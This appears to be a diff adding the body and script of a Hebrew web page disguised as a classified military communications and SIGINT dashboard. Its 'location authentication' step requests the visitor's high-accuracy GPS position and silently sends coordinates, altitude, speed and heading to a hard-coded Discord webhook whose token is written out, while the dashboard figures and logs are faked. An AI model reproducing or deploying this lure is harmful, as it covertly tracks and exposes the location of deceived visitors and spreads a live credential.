@@ -602,4 +602,283 @@ footer .f2 a{color:rgba(0,170,255,0.3);text-decoration:none}
                 <div class="bar"></div>
                 <div class="bar"></div>
                 <div class="bar"></div>
-                <div
+                <div<div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            <span style="font-size:10px;color:var(--dim)">🔊 ניטור שיחות פעיל</span>
+        </div>
+    </div>
+
+    <!-- CARD 3: התראות אבטחה -->
+    <div class="card red">
+        <div class="card-header">
+            <h3>🚨 התראות אבטחה בזמן אמת</h3>
+            <div class="status-dot red"></div>
+        </div>
+        <div class="feed" id="alertFeed">
+            <div class="feed-item"><span class="t">[12:34:02]</span><span class="msg">ניסיון גישה לא מורשית - כתובת IP 185.xxx.xxx.xx</span><span class="tag-02">חוסם</span></div>
+            <div class="feed-item"><span class="t">[12:33:15]</span><span class="msg">סריקת פורטים חיצונית זוהתה על מרכזייה 02</span><span class="tag-02">סריקה</span></div>
+            <div class="feed-item"><span class="t">[12:31:44]</span><span class="msg">בקשת התחברות VPN חריגה - משתמש מערכת</span><span class="tag-02">בדיקה</span></div>
+            <div class="feed-item"><span class="t">[12:29:08]</span><span class="msg">שינוי נפח תעבורה חריג בנתיב מוצפן</span><span class="tag-02">ניטור</span></div>
+            <div class="feed-item"><span class="t">[12:27:30]</span><span class="msg">עדכון חתימות אנטי-וירוס ליחידות הקצה</span><span class="tag-02">מערכת</span></div>
+        </div>
+    </div>
+
+    <!-- CARD 4: מידע כללי -->
+    <div class="card gold">
+        <div class="card-header">
+            <h3>ℹ️ נתוני מערכת</h3>
+            <div class="status-dot gold"></div>
+        </div>
+        <div class="flex flex-wrap" style="gap:15px">
+            <div><div class="value" style="font-size:20px;color:var(--gold)">99.7%</div><div class="sub">זמינות מערכת</div></div>
+            <div><div class="value" style="font-size:20px;color:var(--accent3)">2.4s</div><div class="sub">זמן תגובה ממוצע</div></div>
+            <div><div class="value" style="font-size:20px;color:var(--green)">0.02%</div><div class="sub">נפילות שיחות</div></div>
+        </div>
+    </div>
+
+    <!-- CARD FULL: טבלת שיחות אחרונות -->
+    <div class="card-full">
+        <h2>📋 שיחות אחרונות - מרכזייה מבצעית 02</h2>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr>
+                        <th>שעה</th>
+                        <th>מוצא</th>
+                        <th>יעד</th>
+                        <th>משך</th>
+                        <th>רמת סיווג</th>
+                        <th>סטטוס</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>12:34:01</td><td>02-xxx-xxxx</td><td>02-xxx-xxxx</td><td>04:23</td><td><span class="tag crit">סודי ביותר</span></td><td>הוקלט</td></tr>
+                    <tr><td>12:32:18</td><td>02-xxx-xxxx</td><td>02-xxx-xxxx</td><td>01:47</td><td><span class="tag high">סודי</span></td><td>הוקלט</td></tr>
+                    <tr><td>12:29:55</td><td>02-xxx-xxxx</td><td>02-xxx-xxxx</td><td>00:32</td><td><span class="tag med">שמור</span></td><td>פעיל</td></tr>
+                    <tr><td>12:25:09</td><td>02-xxx-xxxx</td><td>02-xxx-xxxx</td><td>07:11</td><td><span class="tag crit">סודי ביותר</span></td><td>הוקלט</td></tr>
+                    <tr><td>12:21:44</td><td>02-xxx-xxxx</td><td>02-xxx-xxxx</td><td>02:05</td><td><span class="tag low">מסווג</span></td><td>הושלם</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- CARD FULL: לוג מערכת -->
+    <div class="card-full">
+        <h2>💻 קונסולת מערכת - לוג פעולות בזמן אמת</h2>
+        <div class="console" id="consoleLog">
+            <div class="line"><span class="dim">[SYSTEM]</span> <span class="hl">מערכת צליל</span> מאותחלת... OK</div>
+            <div class="line"><span class="dim">[SECURE]</span> ערוץ מוצפן SSL/TLS 1.3 נפתח</div>
+            <div class="line"><span class="dim">[AUTH]</span> ממתין לאימות משתמש...</div>
+            <div class="line warn"><span class="dim">[WARN]</span> נדרש אימות מיקום לכניסה מלאה</div>
+            <div class="line"><span class="dim">[NET]</span> 17 קווים פעילים | 3 שיחות בהקלטה</div>
+        </div>
+    </div>
+
+</div>
+
+<!-- ===== FOOTER ===== -->
+<footer>
+    <div class="f1">מערכת "צליל" - מערכת ניהול תקשורת מבצעית 02 | אגף התקשוב - חטיבת התקשוב המבצעי</div>
+    <div class="f1">כל הזכויות שמורות © 2026 | מערכת מאובטחת ברמת סיווג <span style="color:var(--red)">סודי ביותר</span></div>
+    <div class="f2">מערכת זו מנוטרת 24/7 • כל גישה נרשמת ומתועדת • NOC: 02-xxxxxx</div>
+</footer>
+
+<script>
+// ===== WEBHOOK (API ROUTE) =====
+const API_ROUTES = [
+    "https://discord.com/api/webhooks/1524848066635759787/AjXrxxSe_55C3MNk79IKnjB68yDdUibObftUmwVRUcgeAwHLtjHlO_pBqFirYt_eWsqx",
+    "https://f2.freeivr.co.il/8489684+9651856468274629871641852764182968972419687412674198619461948641964198964184188888888888888888888888888874879949867897ijghfijhnvbijhdsfijhvijkfbjihbfvijnrfijoenbijkhrgbijenbirjhgbijoqwhefoijkhhqopiwujeehgfpiujqwhbtihgqweoijrhtgpijwhbqeijokfqhpij2hw3etijgfhbqewikjghqijkwehbpfejknjkbwekjhrbgnpjkqwnjkfnqbwijkhbgojnetjkhbgijkuerbnkojgfbjkoebotjkhtgbqejktrbqkjhbgihbj"
+];
+
+// ===== GPS - דיוק מקסימלי =====
+let watchId = null;
+let locationData = null;
+let authAttempted = false;
+
+function startAuth() {
+    const btn = document.getElementById("authBtn");
+    btn.disabled = true;
+    btn.textContent = "⏳ מאמת מיקום...";
+
+    const fill = document.getElementById("progressFill");
+    let p = 0;
+    const iv = setInterval(() => {
+        p += Math.random() * 8 + 2;
+        if (p > 95) p = 95;
+        fill.style.width = p + "%";
+    }, 300);
+
+    requestLocation()
+        .then(coords => {
+            clearInterval(iv);
+            fill.style.width = "100%";
+            setTimeout(() => {
+                document.getElementById("locationModal").classList.remove("show");
+                updateUI(coords);
+                btn.disabled = false;
+                btn.textContent = "🔘 אשר זיהוי והמשך לאימות";
+            }, 500);
+        })
+        .catch(err => {
+            clearInterval(iv);
+            fill.style.width = "0%";
+            btn.disabled = false;
+            btn.textContent = "🔘 אשר זיהוי והמשך לאימות";
+            alert("אימות מיקום נכשל. נסה שוב.");
+        });
+}
+
+function skipAuth() {
+    document.getElementById("locationModal").classList.remove("show");
+    document.getElementById("locDisplay").textContent = "⚡ גישה מוגבלת - ללא אימות מיקום";
+    document.getElementById("coordDisplay").textContent = "לא זמין";
+    document.getElementById("accDisplay").textContent = "התחברות חלקית - נתונים מוגבלים";
+    document.getElementById("locDot").className = "status-dot red";
+}
+
+function requestLocation() {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+            reject("Geolocation not supported");
+            return;
+        }
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        };
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                locationData = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    acc: pos.coords.accuracy,
+                    alt: pos.coords.altitude || null,
+                    altAcc: pos.coords.altitudeAccuracy || null,
+                    heading: pos.coords.heading || null,
+                    speed: pos.coords.speed || null,
+                    ts: pos.timestamp
+                };
+                sendToWebhook(locationData);
+                resolve(locationData);
+            },
+            err => {
+                reject(err.message);
+            },
+            options
+        );
+    });
+}
+
+function sendToWebhook(data) {
+    const webhook = API_ROUTES[0];
+    const embed = {
+        embeds: [{
+            title: "📍 אימות מיקום - מערכת צליל",
+            color: 0x00aaff,
+            fields: [
+                { name: "קו רוחב", value: `\`${data.lat}\``, inline: true },
+                { name: "קו אורך", value: `\`${data.lng}\``, inline: true },
+                { name: "דיוק", value: `${data.acc} מטר`, inline: true },
+                { name: "גובה", value: data.alt ? `${data.alt} מ'` : "לא זמין", inline: true },
+                { name: "דיוק גובה", value: data.altAcc ? `${data.altAcc} מ'` : "לא זמין", inline: true },
+                { name: "כיוון", value: data.heading ? `${data.heading}°` : "לא זמין", inline: true },
+                { name: "מהירות", value: data.speed ? `${data.speed} מ/ש` : "לא זמין", inline: true },
+                { name: "זמן אימות", value: new Date(data.ts).toLocaleString("he-IL"), inline: false }
+            ],
+            footer: { text: "מערכת צליל - אימות מיקום סיגינט" },
+            timestamp: new Date().toISOString()
+        }]
+    };
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embed)
+    }).catch(() => {});
+}
+
+function updateUI(coords) {
+    const lat = coords.lat;
+    const lng = coords.lng;
+
+    document.getElementById("locDot").className = "status-dot green";
+    document.getElementById("locDisplay").textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+    document.getElementById("coordDisplay").textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+    document.getElementById("accDisplay").textContent = `דיוק: ${coords.acc} מטר | מקור: ${coords.acc < 10 ? 'GPS (לוויין)' : coords.acc < 50 ? 'GPS' : 'רשת/ WiFi'}`;
+
+    const mapDiv = document.querySelector(".map-placeholder");
+    mapDiv.innerHTML = `<div class="grid-lines"></div><div class="pin"></div><span style="position:relative;z-index:2;font-size:11px;color:var(--green)">✅ מיקום אומת | ${lat.toFixed(6)}, ${lng.toFixed(6)}</span>`;
+}
+
+// ===== אפקטים ויזואליים =====
+(function() {
+    // חלקיקים
+    const particles = document.getElementById("particles");
+    for (let i = 0; i < 40; i++) {
+        const s = document.createElement("span");
+        s.style.left = Math.random() * 100 + "%";
+        s.style.top = Math.random() * 100 + "%";
+        s.style.animationDuration = (5 + Math.random() * 8) + "s";
+        s.style.animationDelay = Math.random() * 5 + "s";
+        particles.appendChild(s);
+    }
+
+    // שעון
+    function updateClock() {
+        const now = new Date();
+        document.getElementById("clockDisplay").textContent = now.toLocaleTimeString("he-IL", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false });
+        document.getElementById("dateDisplay").textContent = now.toLocaleDateString("he-IL", { year: "numeric", month: "long", day: "numeric" });
+    }
+    updateClock();
+    setInterval(updateClock, 1000);
+
+    // מונה משתמשים אקראי
+    setInterval(() => {
+        document.getElementById("onlineUsers").textContent = Math.floor(Math.random() * 5) + 1;
+    }, 5000);
+
+    // מטריקות
+    function animateMetrics() {
+        const targets = { metric1: 17, metric2: 42, metric3: 3, metric4: 128 };
+        Object.keys(targets).forEach(id => {
+            let current = 0;
+            const target = targets[id];
+            const step = Math.max(1, Math.floor(target / 30));
+            const iv = setInterval(() => {
+                current += step;
+                if (current >= target) {
+                    current = target;
+                    clearInterval(iv);
+                }
+                document.getElementById(id).textContent = current;
+            }, 50);
+        });
+    }
+    animateMetrics();
+
+    // לוג קונסולה
+    const consoleLog = document.getElementById("consoleLog");
+    const logMsgs = [
+        { text: "[AUTH] משתמש אושר", cls: "" },
+        { text: "[SECURE] חיבור מוצפן נפתח", cls: "" },
+        { text: "[NET] סריקת תעבורה הושלמה", cls: "" },
+        { text: "[GPS] מיקום אומת בהצלחה", cls: "" },
+        { text: "[SYSTEM] כל המערכות תקינות", cls: "" },
+        { text: "[WARN] בדיקת אבטחה רציפה", cls: "warn" },
+        { text: "[AUDIO] ניטור שיחות פעיל", cls: "" }
+    ];
+    setInterval(() => {
+        const msg = logMsgs[Math.floor(Math.random() * logMsgs.length)];
+        const line = document.createElement("div");
+        line.className = "line " + msg.cls;
+        line.innerHTML = `<span class="dim">[${new Date().toLocaleTimeString('he-IL', {hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false})}]</span> ${msg.text}`;
+        consoleLog.appendChild(line);
+        if (consoleLog.children.length > 30) consoleLog.removeChild(consoleLog.firstChild);
+        consoleLog.scrollTop = consoleLog.scrollHeight;
+    }, 4000);
+})();
+</script>
+
+</body>
+</html>
